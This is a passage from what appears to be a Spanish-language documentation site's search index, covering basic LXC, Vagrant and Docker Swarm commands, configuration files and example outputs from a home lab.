base"},{"location":"virtualizacion/Lxc/#comandos-basicos_1","text":"# crear un contnedor ubuntu llamado myvm lxc lunch ubuntu/20.10 myvm # arrancar, parar, eliminar lxc start myvm lxc stop myvm lxc delete myvm # ejcutar commando dentro del shell lxc exec myvm bash # copiar contenedor lxc copy myvm newvm # renombrar contenedor lxc move myvm groovy # ver informacion del contenedor y su configuraci\u00f3n lxc info groovy lxc config show groovy","title":"Comandos b\u00e1sicos"},{"location":"virtualizacion/Lxc/#config-contenedores","text":"Los contenedores e pueden na\u00f1adir configraciones extra o limitaciones como por ejemplo ram o cpu, existen muchas opciones a configurar # limitar memoria y cpu lxc config set groovy limits.memory 512MB lxc config set groovy limits.cpu 1 lxc config show groovy # dar permisos extra para poder crear contenedores recursivos lxc config set groovy security.privileged true lxc config set groovy security.nesting true","title":"Config contenedores"},{"location":"virtualizacion/Lxc/#profile","text":"por defecto existe la configuraci\u00f3n default para contenedore que se asigna automaticamente, si creamos nuestra propia configuraci\u00f3n la podemos asignar a nuevos contenedores. # listar y ver profile lxc profile list lxc profile show default # crear un profil nuevo y editarlo al gusto lxc profile copy default custom lxc profile edit custom # asignar profile a un nuevo contenedor lxc lunch ubuntu/20.10 groovy --profile custom","title":"Profile"},{"location":"virtualizacion/Lxc/#file","text":"file permite a\u00f1adir o exttraer archivos a un contenedor lxc file push myfile groovy/root lxc file pull groovy/root/myfile .","title":"File"},{"location":"virtualizacion/Lxc/#snapshot_1","text":"Se pueden hacer copias de seguridad r\u00e1pidamente creando un snapshot del contenedor y en cualquier momento restaurarlo # crear snashot snap1 de contenedor groovy lxc snapshot groovy snap1 # ver snap creado lxc info groovy # restaurar snapshot lxc restore groovy snap1","title":"Snapshot"},{"location":"virtualizacion/Vagrant/","text":"Vagrant Vagrant es una herramienta que nos ayuda a desplegar m\u00e1quinas virtualizadas r\u00e1pidamente, ademas a estas m\u00e1quinas se les puede a\u00f1adir una configuraci\u00f3n en el despliege via script, ansible y otros, donde podremos desplegar y configurar una o varias m\u00e1quinas de manera r\u00e1pida y eficaz. Cabe decir que vagrant es solo la herramienta de despliegue, necesita de un proveedor de virtualizaci\u00f3n, como VirtualBox , VMware , Amazon EC2 , LXC , DigitalOcean , libvirt, etc. Doc vagrant Doc vagrant-libvirt Instalaci\u00f3n Para que vagrant funcione hay que tener un proveedor de m\u00e1quinas virtuales, tipo virtualbox, libvirt, etc. El el siguiente recuadro se muestra como intalar Vagrant para el proveedor libvirt, par otros proveedores consultar el enlace de documentaci\u00f3n. Instalaci\u00f3n vagrant debian wiki Doc instalaci\u00f3n vagrant # Instalar vagrant-libvirt sudo apt install vagrant-libvirt libvirt-daemon-system # a\u00f1adir usuario al grupo libvirt para evitr utilizar sudo sudo usermod --append --groups libvirt $USER # reiniciada la sesi\u00f3n comprovar el user a\u00f1adido al grupo y la versi\u00f3n de vagrant cat /etc/group | grep libvirt vagrant --version Vagrant 2 .2.3 Boxes En vagrant Boxes juega un papel inportante, ya que es el repositorio de imagenes base. Estas imagenes ya son un sistema operativo intalado y listo para utilizar, aqui recae la gracia y rapidez de vagrant. Boxes search Una vez vas desplegando m\u00e1quinas se van guardando las imagenes localmente. \u279c vagrant box list debian/buster64 ( libvirt, 10 .4.0 ) debian/buster64 ( virtualbox, 10 .4.0 ) ubuntu/trusty64 ( virtualbox, 20190514 .0.0 ) Desplegar Al desplegar m\u00e1quinas con vagrant hay que tener en cuenta que crea archivos para guardar configuraciones, por lo tanto es buena pr\u00e1ctica crear un directorio donde se va a crear cada entorno de m\u00e1quinas. En el siguiente ejemplo se muestra como desplegar una m\u00e1quina debian buster con el proveedor libvirt # iniciar directorio como entorno vagrant con base debian/buster vagrant init debian/buster64 # levantar m\u00e1quina con entorno libvirt vagrant up --provider = libvirt # ahora ya podemos acceder a la shell de la m\u00e1quina vagrant ssh Los archivos que genera el entorno vagrant son .vagrant archivos relacionados con la m\u00e1quina virtual y Vagrantfile configuraci\u00f3n a asignar a la m\u00e1quina. \u279c ls -al total 16 drwxr-xr-x 3 debian debian 4096 ene 15 10 :55 . drwxr-xr-x 12 debian debian 4096 ene 15 10 :47 .. drwxr-xr-x 4 debian debian 4096 ene 15 10 :55 .vagrant -rw-r--r-- 1 debian debian 3022 ene 15 10 :52 Vagrantfile Comandos b\u00e1sicos vagrant init debian/buster64 vagrant up vagrant up --provider = libvirt vagrant ssh vagrant halt vagrant up vagrant destroy vagrant reload vagrant box list vagrant snapshot list vagrant snapshot save [ maquina ] name-snap vagrant snapshot restore [ maquina ] name-snap vagrant snapshot delete [ maquina ] name-snap Configuraciones Una vez iniciado un entorno vagrant con init se cre un archivo VagrantFile donde configuramos la/s m\u00e1quina que queremos desplegar. config.vm.define \"mv0\" do | test | test.vm.box = \"debian/buster64\" test.vm.hostname = \"mv0 test.vm.provider :libvirt do |lb| lb.memory = \" 1024 \" end end Aprovisionamiento El aprovisionamiento es una de las grandes utilidades de la configuraci\u00f3n de vagrant, sirve para instalar o configurar todo lo que necesites en el primer arranque de la m\u00e1quina. Para hacer este despliege puedes utilizar, shell, script, ansible, chef, etc. VagrantFile # despliege con shell config.vm.provision \"shell\" , inline: <<-SHELL apt-get update apt-get install -y nginx SHELL # depliege con script config.vm.provision \"shell\" , path: 'script.sh' # despliege con ansible config.vm.provision \"ansible\" do | ansible | ansible.playbook = \"instrucciones.yml\" end Rendimiento La configuraci\u00f3n del rendimiento que quieres dar a una m\u00e1quina es importante, en la secci\u00f3n provider podemos configurar cuanta ram mo cpu tendr\u00e1 nuestra m\u00e1quina. opciones rendimiento con libvirt config.vm.provider :libvirt do | lb | lb.memory = \"1024\" lb.cpus = 2 end Network Doc Por defecto vagrant crea las m\u00e1quinas con un interfaz NAT hacia nuestro host, donde se veran entre ellas pero desde el exterior no podras ver la m\u00e1quina virtual. Private_network esta opci\u00f3n a\u00f1ade una red privada, que solo se veran entre las maquinas virtuales. Public-network esta opci\u00f3n cre un bridge a la interfaz del host y se vera como una m\u00e1quina mas en la LAN Forwarded_port redireccionar un puerto de el host a la m\u00e1quina virtual. # redireccionmiento de vpuerto a la interfaz localhost config.vm.network \"forwarded_port\" , guest: 80 , host: 8080 # redireccionmiento de vpuerto a la interfaz 192.168.88.2 config.vm.network \"forwarded_port\" , guest: 80 , host: 8080 , host_ip: \"192.168.88.2\" # interfaz privada config.vm.network \"private_network\" , ip: \"192.168.33.10\" # interfaz publica config.vm.network \"public_network\" En libvirt la interfaz publica da problemas y se tiene que crear un bridge anualmente para que fincuione correctamente. # VagrantFile config.vm.network \"public_network\" , dev: \"br0\" , mode: \"bridge\" , type: \"bridge\" # /etc/network/interfaces ... auto br0 iface br0 inet dhcp bridge_ports enp3s0 bridge_stp off bridge_fd 0 bridge_maxwait 0 Volumes Los puntos de montaje siempre son utiles para transferir archivos entre nuestras m\u00e1quinas. Doc volumes config.vm.synced_folder \"../data\" , \"/vagrant_data\" Discos A\u00f1adir discos extra a la m\u00e1quina virtual Doc discos config.vm.provider :libvirt do | lb | lb.storage :file, size: '2G' lb.storage :file, size: '2G' end Multi_maquina Para seg\u00fan que proyectos es necesario levantar mas de una m\u00e1quina virtual. Pues simplemente definiendo multiples m\u00e1quinas en el archivo VagrantFile se desplegaran a la vez. Doc multi machine Vagrant.configure ( \"2\" ) do | config | config.vm.define \"web1\" do | test | test.vm.box = \"debian/buster64\" test.vm.provider :libvirt test.vm.hostname = \"ojoaldato.net\" test.vm.network \"public_network\" , dev: \"br0\" , mode: \"bridge\" , type: \"bridge\" config.vm.provision \"shell\" , inline: <<-SHELL apt-get update apt-get install -y nginx SHELL end # --------------------- config.vm.define \"web2\" do | test | test.vm.box = \"debian/buster64\" test.vm.provider :libvirt test.vm.hostname = \"vayviene.net\" test.vm.network \"public_network\" , dev: \"br0\" , mode: \"bridge\" , type: \"bridge\" config.vm.provision \"shell\" , inline: <<-SHELL apt-get update apt-get install -y nginx SHELL end end Snapshot sintaxis vagrant snapshot save [maquina] name-snap # crear snapshot \u279c vagrant vagrant snapshot save web snap01 == > web: Snapshotting the machine as 'snap01' ... == > web: Snapshot saved! You can restore the snapshot at any time by == > web: using ` vagrant snapshot restore ` . You can delete it using == > web: ` vagrant snapshot delete ` . # ver snapshot \u279c vagrant vagrant snapshot list == > web: snap01 # restaurar snap \u279c vagrant vagrant snapshot restore web snap01 # eliminar snap \u279c vagrant vagrant snapshot delete web snap01","title":"Vagrant"},{"location":"virtualizacion/Vagrant/#vagrant","text":"Vagrant es una herramienta que nos ayuda a desplegar m\u00e1quinas virtualizadas r\u00e1pidamente, ademas a estas m\u00e1quinas se les puede a\u00f1adir una configuraci\u00f3n en el despliege via script, ansible y otros, donde podremos desplegar y configurar una o varias m\u00e1quinas de manera r\u00e1pida y eficaz. Cabe decir que vagrant es solo la herramienta de despliegue, necesita de un proveedor de virtualizaci\u00f3n, como VirtualBox , VMware , Amazon EC2 , LXC , DigitalOcean , libvirt, etc. Doc vagrant Doc vagrant-libvirt","title":"Vagrant"},{"location":"virtualizacion/Vagrant/#instalacion","text":"Para que vagrant funcione hay que tener un proveedor de m\u00e1quinas virtuales, tipo virtualbox, libvirt, etc. El el siguiente recuadro se muestra como intalar Vagrant para el proveedor libvirt, par otros proveedores consultar el enlace de documentaci\u00f3n. Instalaci\u00f3n vagrant debian wiki Doc instalaci\u00f3n vagrant # Instalar vagrant-libvirt sudo apt install vagrant-libvirt libvirt-daemon-system # a\u00f1adir usuario al grupo libvirt para evitr utilizar sudo sudo usermod --append --groups libvirt $USER # reiniciada la sesi\u00f3n comprovar el user a\u00f1adido al grupo y la versi\u00f3n de vagrant cat /etc/group | grep libvirt vagrant --version Vagrant 2 .2.3","title":"Instalaci\u00f3n"},{"location":"virtualizacion/Vagrant/#boxes","text":"En vagrant Boxes juega un papel inportante, ya que es el repositorio de imagenes base. Estas imagenes ya son un sistema operativo intalado y listo para utilizar, aqui recae la gracia y rapidez de vagrant. Boxes search Una vez vas desplegando m\u00e1quinas se van guardando las imagenes localmente. \u279c vagrant box list debian/buster64 ( libvirt, 10 .4.0 ) debian/buster64 ( virtualbox, 10 .4.0 ) ubuntu/trusty64 ( virtualbox, 20190514 .0.0 )","title":"Boxes"},{"location":"virtualizacion/Vagrant/#desplegar","text":"Al desplegar m\u00e1quinas con vagrant hay que tener en cuenta que crea archivos para guardar configuraciones, por lo tanto es buena pr\u00e1ctica crear un directorio donde se va a crear cada entorno de m\u00e1quinas. En el siguiente ejemplo se muestra como desplegar una m\u00e1quina debian buster con el proveedor libvirt # iniciar directorio como entorno vagrant con base debian/buster vagrant init debian/buster64 # levantar m\u00e1quina con entorno libvirt vagrant up --provider = libvirt # ahora ya podemos acceder a la shell de la m\u00e1quina vagrant ssh Los archivos que genera el entorno vagrant son .vagrant archivos relacionados con la m\u00e1quina virtual y Vagrantfile configuraci\u00f3n a asignar a la m\u00e1quina. \u279c ls -al total 16 drwxr-xr-x 3 debian debian 4096 ene 15 10 :55 . drwxr-xr-x 12 debian debian 4096 ene 15 10 :47 .. drwxr-xr-x 4 debian debian 4096 ene 15 10 :55 .vagrant -rw-r--r-- 1 debian debian 3022 ene 15 10 :52 Vagrantfile","title":"Desplegar"},{"location":"virtualizacion/Vagrant/#comandos-basicos","text":"vagrant init debian/buster64 vagrant up vagrant up --provider = libvirt vagrant ssh vagrant halt vagrant up vagrant destroy vagrant reload vagrant box list vagrant snapshot list vagrant snapshot save [ maquina ] name-snap vagrant snapshot restore [ maquina ] name-snap vagrant snapshot delete [ maquina ] name-snap","title":"Comandos b\u00e1sicos"},{"location":"virtualizacion/Vagrant/#configuraciones","text":"Una vez iniciado un entorno vagrant con init se cre un archivo VagrantFile donde configuramos la/s m\u00e1quina que queremos desplegar. config.vm.define \"mv0\" do | test | test.vm.box = \"debian/buster64\" test.vm.hostname = \"mv0 test.vm.provider :libvirt do |lb| lb.memory = \" 1024 \" end end","title":"Configuraciones"},{"location":"virtualizacion/Vagrant/#aprovisionamiento","text":"El aprovisionamiento es una de las grandes utilidades de la configuraci\u00f3n de vagrant, sirve para instalar o configurar todo lo que necesites en el primer arranque de la m\u00e1quina. Para hacer este despliege puedes utilizar, shell, script, ansible, chef, etc. VagrantFile # despliege con shell config.vm.provision \"shell\" , inline: <<-SHELL apt-get update apt-get install -y nginx SHELL # depliege con script config.vm.provision \"shell\" , path: 'script.sh' # despliege con ansible config.vm.provision \"ansible\" do | ansible | ansible.playbook = \"instrucciones.yml\" end","title":"Aprovisionamiento"},{"location":"virtualizacion/Vagrant/#rendimiento","text":"La configuraci\u00f3n del rendimiento que quieres dar a una m\u00e1quina es importante, en la secci\u00f3n provider podemos configurar cuanta ram mo cpu tendr\u00e1 nuestra m\u00e1quina. opciones rendimiento con libvirt config.vm.provider :libvirt do | lb | lb.memory = \"1024\" lb.cpus = 2 end","title":"Rendimiento"},{"location":"virtualizacion/Vagrant/#network","text":"Doc Por defecto vagrant crea las m\u00e1quinas con un interfaz NAT hacia nuestro host, donde se veran entre ellas pero desde el exterior no podras ver la m\u00e1quina virtual. Private_network esta opci\u00f3n a\u00f1ade una red privada, que solo se veran entre las maquinas virtuales. Public-network esta opci\u00f3n cre un bridge a la interfaz del host y se vera como una m\u00e1quina mas en la LAN Forwarded_port redireccionar un puerto de el host a la m\u00e1quina virtual. # redireccionmiento de vpuerto a la interfaz localhost config.vm.network \"forwarded_port\" , guest: 80 , host: 8080 # redireccionmiento de vpuerto a la interfaz 192.168.88.2 config.vm.network \"forwarded_port\" , guest: 80 , host: 8080 , host_ip: \"192.168.88.2\" # interfaz privada config.vm.network \"private_network\" , ip: \"192.168.33.10\" # interfaz publica config.vm.network \"public_network\" En libvirt la interfaz publica da problemas y se tiene que crear un bridge anualmente para que fincuione correctamente. # VagrantFile config.vm.network \"public_network\" , dev: \"br0\" , mode: \"bridge\" , type: \"bridge\" # /etc/network/interfaces ... auto br0 iface br0 inet dhcp bridge_ports enp3s0 bridge_stp off bridge_fd 0 bridge_maxwait 0","title":"Network"},{"location":"virtualizacion/Vagrant/#volumes","text":"Los puntos de montaje siempre son utiles para transferir archivos entre nuestras m\u00e1quinas. Doc volumes config.vm.synced_folder \"../data\" , \"/vagrant_data\"","title":"Volumes"},{"location":"virtualizacion/Vagrant/#discos","text":"A\u00f1adir discos extra a la m\u00e1quina virtual Doc discos config.vm.provider :libvirt do | lb | lb.storage :file, size: '2G' lb.storage :file, size: '2G' end","title":"Discos"},{"location":"virtualizacion/Vagrant/#multi_maquina","text":"Para seg\u00fan que proyectos es necesario levantar mas de una m\u00e1quina virtual. Pues simplemente definiendo multiples m\u00e1quinas en el archivo VagrantFile se desplegaran a la vez. Doc multi machine Vagrant.configure ( \"2\" ) do | config | config.vm.define \"web1\" do | test | test.vm.box = \"debian/buster64\" test.vm.provider :libvirt test.vm.hostname = \"ojoaldato.net\" test.vm.network \"public_network\" , dev: \"br0\" , mode: \"bridge\" , type: \"bridge\" config.vm.provision \"shell\" , inline: <<-SHELL apt-get update apt-get install -y nginx SHELL end # --------------------- config.vm.define \"web2\" do | test | test.vm.box = \"debian/buster64\" test.vm.provider :libvirt test.vm.hostname = \"vayviene.net\" test.vm.network \"public_network\" , dev: \"br0\" , mode: \"bridge\" , type: \"bridge\" config.vm.provision \"shell\" , inline: <<-SHELL apt-get update apt-get install -y nginx SHELL end end","title":"Multi_maquina"},{"location":"virtualizacion/Vagrant/#snapshot","text":"sintaxis vagrant snapshot save [maquina] name-snap # crear snapshot \u279c vagrant vagrant snapshot save web snap01 == > web: Snapshotting the machine as 'snap01' ... == > web: Snapshot saved! You can restore the snapshot at any time by == > web: using ` vagrant snapshot restore ` . You can delete it using == > web: ` vagrant snapshot delete ` . # ver snapshot \u279c vagrant vagrant snapshot list == > web: snap01 # restaurar snap \u279c vagrant vagrant snapshot restore web snap01 # eliminar snap \u279c vagrant vagrant snapshot delete web snap01","title":"Snapshot"},{"location":"virtualizacion/kubernetes/","text":"Kubernetes La documentaci\u00f3n asociada a kubernetes es muy extensa, para verla selecciona aqui","title":"Kubernetes"},{"location":"virtualizacion/kubernetes/#kubernetes","text":"La documentaci\u00f3n asociada a kubernetes es muy extensa, para verla selecciona aqui","title":"Kubernetes"},{"location":"virtualizacion/swarm/","text":"Swarm Swarm es el conjunto de nodos que forman la orquestra. Como m\u00ednimo hay un nodo que hace de manager y worker, los dem\u00e1s nodos que se a\u00f1adan ser\u00e1n workers a no ser que se a\u00f1ada mas de un manager pero se especificar\u00e1 uno como lider. La gesti\u00f3n de las tareas y donde repartirlas, se encarga el manager, siempre se trabaja contra el manager. Swarm trabaja con el puerto 2377 para su comunicaci\u00f3n interna. Stack : Es una app que corre dentro de swarm ( un docker-compose.yml forma una stack ), los contenedores que forman la app corren dentro de los nodos. Service : ( routing mesh ) red de todos a todos es la manera que tiene swarm de gestionar los puertos y el repartidor de carga en un stack, una vez expuesto un puerto puedes consultar cualquier nodo que te contestaran por igual. Comandos b\u00e1sicos # swarm ------------------------------------------------ docker swarm init # iniciar swarm # iniciar worker docker swarm join --token SWMTKN-1-4qagsse8jlngffwmce3epujd7ws8supro93iik25cu634w9szv-a94ktkie6xekc9xp883sj0jbv 192 .168.88.2:2377 docker node ls # ver nodos docker swarm join-token manager # token para a\u00f1adir managers docker swarm join-token worker # token para a\u00f1adir worker # stack ---------------------------------------------------- docker stack deploy -c docker-compose.yml app # desplegar stack con nombre app docker stack ps app # visualizar contenedores docker stack ls # visualizar stack docker stack services app # visualizar servicios de stack docker service ps app_hello # visualizar contenedores de un servicio docker service inspect app_hello # visualizar servicio detallado docker service scale app_hello = 4 # escalar numero de replicas docker stack rm app # borrar stack # nodos -------------------------------------------------- docker node ls docker node inspect pc02 --pretty docker node update --availability pause pc03 docker node update --availability drain pc03 # vaciar nodo docker node update --availability active pc03 docker node update --label-add lloc = local pc03 # a\u00f1adir label docker node rm node-2 docker swarm leave # quitar worker docker swarm leave --force # quitar manager Iniciar swarm Al iniciar el manager indica el token con el que agrupar los workers \u279c docker swarm init Swarm initialized: current node ( yuc0or5k3izprm0go81keye7u ) is now a manager. To add a worker to this swarm, run the following command: docker swarm join --token SWMTKN-1-4qagsse8jlngffwmce3epujd7ws8supro93iik25cu634w9szv-a94ktkie6xekc9xp883sj0jbv 192 .168.88.2:2377 To add a manager to this swarm, run 'docker swarm join-token manager' and follow the instructions. iniciar worker [ jorge@pc03 ~ ] $ docker swarm join --token SWMTKN-1-4qagsse8jlngffwmce3epujd7ws8supro93iik25cu634w9szv-a94ktkie6xekc9xp883sj0jbv 192 .168.88.2:2377 This node joined a swarm as a worker. nodos activos \u279c docker node ls ID HOSTNAME STATUS AVAILABILITY MANAGER STATUS ENGINE VERSION yuc0or5k3izprm0go81keye7u * pc02 Ready Active Leader 19 .03.6 retgjptxz1di57xc85qym6atv pc03 Ready Active 19 .03.7 \u279c docker swarm join-token manager # token para a\u00f1adir managers \u279c docker swarm join-token worker # token para a\u00f1adir worker Gesti\u00f3n stack version : \"3\" services : hello : image : edtasixm11/k19:hello deploy : replicas : 3 ports : - \"80:80\" networks : - mynet portainer : image : portainer/portainer ports : - \"9000:9000\" volumes : - \"/var/run/docker.sock:/var/run/docker.sock\" networks : - mynet networks : mynet : # desplegar stack con nombre app \u279c docker stack deploy -c docker-compose.yml app # visualizar contenedores \u279c docker stack ps app ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS oan9jbh0co9w app_portainer.1 portainer/portainer:latest pc02 Running Running 7 seconds ago wp48mobq8uve app_hello.1 edtasixm11/k19:hello pc03 Running Preparing 43 seconds ago ps1wx40lopar app_hello.2 edtasixm11/k19:hello pc02 Running Running 7 seconds ago ltiaa8qrz1kp app_hello.3 edtasixm11/k19:hello pc03 Running Preparing 43 seconds ago # visualizar stack \u279c docker stack ls NAME SERVICES ORCHESTRATOR app 3 Swarm # visualizar servicios de stack \u279c docker stack services app ID NAME MODE REPLICAS IMAGE PORTS nxo472jynnbt app_visualizer replicated 1 /1 dockersamples/visualizer:stable *:8080->8080/tcp y1feo3pbnb83 app_hello replicated 3 /3 edtasixm11/k19:hello *:80->80/tcp ybau52gmcszq app_portainer replicated 1 /1 portainer/portainer:latest *:9000->9000/tcp # visualizar contenedores de un servicio \u279c docker service ps app_hello ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS wp48mobq8uve app_hello.1 edtasixm11/k19:hello pc03 Running Running 8 minutes ago ps1wx40lopar app_hello.2 edtasixm11/k19:hello pc02 Running Running 8 minutes ago ltiaa8qrz1kp app_hello.3 edtasixm11/k19:hello pc03 Running Running 8 minutes ago # visualizar servicio detallado \u279c docker service inspect app_hello # escalar numero de replicas \u279c docker service scale app_hello = 4 app_hello scaled to 4 overall progress: 4 out of 4 tasks 1 /4: running [================================================== > ] 2 /4: running [================================================== > ] 3 /4: running [================================================== > ] 4 /4: running [================================================== > ] verify: Service converged Gesti\u00f3n nodos \u279c docker node ls # listar nodos ID HOSTNAME STATUS AVAILABILITY MANAGER STATUS ENGINE VERSION yuc0or5k3izprm0go81keye7u * pc02 Ready Active Leader 19 .03.6 retgjptxz1di57xc85qym6atv pc03 Ready Active 19 .03.7 # pausar nodo, en modo pausa no acepta nuevas tareas pere ejcuta las existentes. \u279c docker node update --availability pause pc03 pc03 \u279c docker node ls ID HOSTNAME STATUS AVAILABILITY MANAGER STATUS ENGINE VERSION yuc0or5k3izprm0go81keye7u * pc02 Ready Active Leader 19 .03.6 retgjptxz1di57xc85qym6atv pc03 Ready Pause 19 .03.7 # nodo drain, se desace de todos sus contenedores pasandolos a otros nodos \u279c docker node update --availability drain pc03 # nodo active, se reactiva el nodo. \u279c docker node update --availability active pc03 Cuando vuelve a configurar el nodo en Disponibilidad activa, puede recibir nuevas tareas: durante una actualizaci\u00f3n de servicio para escalar durante una actualizaci\u00f3n continua cuando configura otro nodo para Drenar disponibilidad cuando una tarea falla en otro nodo activo Labels # a\u00f1adir label a nodo \u279c docker node update --label-add lloc=local pc03 ... visualizer : image : dockersamples/visualizer:stable ports : - \"8080:8080\" volumes : - \"/var/run/docker.sock:/var/run/docker.sock\" deploy : placement : constraints : [ node.labels.lloc == local ] networks : - mynet ... deploy : placement : constraints : - node.role == manager - engine.labels.operatingsystem == ubuntu 14.04 - node.labels.lloc == local apagar stack y quitar nodos # borrar stack \u279c docker stack rm app Removing service app_hello Removing service app_portainer Removing service app_visualizer Removing network app_mynet # quitar worker [ jorge@pc03 ~ ] $ docker swarm leave Node left the swarm. # quitar manager y parar swarm \u279c docker swarm leave --force puertos Obrir ports en el worker: \u25cf 80 \u25cf 8080 \u25cf 9000 \u25cf 2377 per gestio de nodes \u25cf Port 7946 UDP for container network discovery. \u25cf Port 7946 TCP for container network discovery. \u25cf Port 4789 UDP for the container ingress network. Obrir ports en manager: \u25cf Port 7946 UDP for container network discovery. \u25cf Port 7946 TCP for container network discovery. \u25cf Port 4789 UDP for the container ingress network. Modo global El modo global es un modo en el que se har\u00e1 un despliegue de un contenedor en cada nodo, si hay 3 nodos se crear\u00e1n tres replicas. version : \"3.7\" services : worker : image : dockersamples/examplevotingapp_worker deploy : mode : global","title":"Swarm"},{"location":"virtualizacion/swarm/#swarm","text":"Swarm es el conjunto de nodos que forman la orquestra. Como m\u00ednimo hay un nodo que hace de manager y worker, los dem\u00e1s nodos que se a\u00f1adan ser\u00e1n workers a no ser que se a\u00f1ada mas de un manager pero se especificar\u00e1 uno como lider. La gesti\u00f3n de las tareas y donde repartirlas, se encarga el manager, siempre se trabaja contra el manager. Swarm trabaja con el puerto 2377 para su comunicaci\u00f3n interna. Stack : Es una app que corre dentro de swarm ( un docker-compose.yml forma una stack ), los contenedores que forman la app corren dentro de los nodos. Service : ( routing mesh ) red de todos a todos es la manera que tiene swarm de gestionar los puertos y el repartidor de carga en un stack, una vez expuesto un puerto puedes consultar cualquier nodo que te contestaran por igual.","title":"Swarm"},{"location":"virtualizacion/swarm/#comandos-basicos","text":"# swarm ------------------------------------------------ docker swarm init # iniciar swarm # iniciar worker docker swarm join --token SWMTKN-1-4qagsse8jlngffwmce3epujd7ws8supro93iik25cu634w9szv-a94ktkie6xekc9xp883sj0jbv 192 .168.88.2:2377 docker node ls # ver nodos docker swarm join-token manager # token para a\u00f1adir managers docker swarm join-token worker # token para a\u00f1adir worker # stack ---------------------------------------------------- docker stack deploy -c docker-compose.yml app # desplegar stack con nombre app docker stack ps app # visualizar contenedores docker stack ls # visualizar stack docker stack services app # visualizar servicios de stack docker service ps app_hello # visualizar contenedores de un servicio docker service inspect app_hello # visualizar servicio detallado docker service scale app_hello = 4 # escalar numero de replicas docker stack rm app # borrar stack # nodos -------------------------------------------------- docker node ls docker node inspect pc02 --pretty docker node update --availability pause pc03 docker node update --availability drain pc03 # vaciar nodo docker node update --availability active pc03 docker node update --label-add lloc = local pc03 # a\u00f1adir label docker node rm node-2 docker swarm leave # quitar worker docker swarm leave --force # quitar manager","title":"Comandos b\u00e1sicos"},{"location":"virtualizacion/swarm/#iniciar-swarm","text":"Al iniciar el manager indica el token con el que agrupar los workers \u279c docker swarm init Swarm initialized: current node ( yuc0or5k3izprm0go81keye7u ) is now a manager. To add a worker to this swarm, run the following command: docker swarm join --token SWMTKN-1-4qagsse8jlngffwmce3epujd7ws8supro93iik25cu634w9szv-a94ktkie6xekc9xp883sj0jbv 192 .168.88.2:2377 To add a manager to this swarm, run 'docker swarm join-token manager' and follow the instructions. iniciar worker [ jorge@pc03 ~ ] $ docker swarm join --token SWMTKN-1-4qagsse8jlngffwmce3epujd7ws8supro93iik25cu634w9szv-a94ktkie6xekc9xp883sj0jbv 192 .168.88.2:2377 This node joined a swarm as a worker. nodos activos \u279c docker node ls ID HOSTNAME STATUS AVAILABILITY MANAGER STATUS ENGINE VERSION yuc0or5k3izprm0go81keye7u * pc02 Ready Active Leader 19 .03.6 retgjptxz1di57xc85qym6atv pc03 Ready Active 19 .03.7 \u279c docker swarm join-token manager # token para a\u00f1adir managers \u279c docker swarm join-token worker # token para a\u00f1adir worker","title":"Iniciar swarm"},{"location":"virtualizacion/swarm/#gestion-stack","text":"version : \"3\" services : hello : image : edtasixm11/k19:hello deploy : replicas : 3 ports : - \"80:80\" networks : - mynet portainer : image : portainer/portainer ports : - \"9000:9000\" volumes : - \"/var/run/docker.sock:/var/run/docker.sock\" networks : - mynet networks : mynet : # desplegar stack con nombre app \u279c docker stack deploy -c docker-compose.yml app # visualizar contenedores \u279c docker stack ps app ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS oan9jbh0co9w app_portainer.1 portainer/portainer:latest pc02 Running Running 7 seconds ago wp48mobq8uve app_hello.1 edtasixm11/k19:hello pc03 Running Preparing 43 seconds ago ps1wx40lopar app_hello.2 edtasixm11/k19:hello pc02 Running Running 7 seconds ago ltiaa8qrz1kp app_hello.3 edtasixm11/k19:hello pc03 Running Preparing 43 seconds ago # visualizar stack \u279c docker stack ls NAME SERVICES ORCHESTRATOR app 3 Swarm # visualizar servicios de stack \u279c docker stack services app ID NAME MODE REPLICAS IMAGE PORTS nxo472jynnbt app_visualizer replicated 1 /1 dockersamples/visualizer:stable *:8080->8080/tcp y1feo3pbnb83 app_hello replicated 3 /3 edtasixm11/k19:hello *:80->80/tcp ybau52gmcszq app_portainer replicated 1 /1 portainer/portainer:latest *:9000->9000/tcp # visualizar contenedores de un servicio \u279c docker service ps app_hello ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS wp48mobq8uve app_hello.1 edtasixm11/k19:hello pc03 Running Running 8 minutes ago ps1wx40lopar app_hello.2 edtasixm11/k19:hello pc02 Running Running 8 minutes ago ltiaa8qrz1kp app_hello.3 edtasixm11/k19:hello pc03 Running Running 8 minutes ago # visualizar servicio detallado \u279c docker service inspect app_hello # escalar numero de replicas \u279c docker service scale app_hello = 4 app_hello scaled to 4 overall progress: 4 out of 4 tasks 1 /4: running [================================================== > ] 2 /4: running [================================================== > ] 3 /4: running [================================================== > ] 4 /4: running [================================================== > ] verify: Service converged","title":"Gesti\u00f3n stack"},{"location":"virtualizacion/swarm/#gestion-nodos","text":"\u279c docker node ls # listar nodos ID HOSTNAME STATUS AVAILABILITY MANAGER STATUS ENGINE VERSION yuc0or5k3izprm0go81keye7u * pc02 Ready Active Leader 19 .03.6 retgjptxz1di57xc85qym6atv pc03 Ready Active 19 .03.7 # pausar nodo, en modo pausa no acepta nuevas tareas pere ejcuta las existentes. \u279c docker node update --availability pause pc03 pc03 \u279c docker node ls ID HOSTNAME STATUS AVAILABILITY MANAGER STATUS ENGINE VERSION yuc0or5k3izprm0go81keye7u * pc02 Ready Active Leader 19 .03.6 retgjptxz1di57xc85qym6atv pc03 Ready Pause 19 .03.7 # nodo drain, se desace de todos sus contenedores pasandolos a otros nodos \u279c docker node update --availability drain pc03 # nodo active, se reactiva el nodo. \u279c docker node update --availability active pc03 Cuando vuelve a configurar el nodo en Disponibilidad activa, puede recibir nuevas tareas: durante una actualizaci\u00f3n de servicio para escalar durante una actualizaci\u00f3n continua cuando configura otro nodo para Drenar disponibilidad cuando una tarea falla en otro nodo activo","title":"Gesti\u00f3n nodos"},{"location":"virtualizacion/swarm/#labels","text":"# a\u00f1adir label a nodo \u279c docker node update --label-add lloc=local pc03 ... visualizer : image : dockersamples/visualizer:stable ports : - \"8080:8080\" volumes : - \"/var/run/docker.sock:/var/run/docker.sock\" deploy : placement : constraints : [ node.labels.lloc == local ] networks : - mynet ... deploy : placement : constraints : - node.role == manager - engine.labels.operatingsystem == ubuntu 14.04 - node.labels.lloc == local apagar stack y quitar nodos # borrar stack \u279c docker stack rm app Removing service app_hello Removing service app_portainer Removing service app_visualizer Removing network app_mynet # quitar worker [ jorge@pc03 ~ ] $ docker swarm 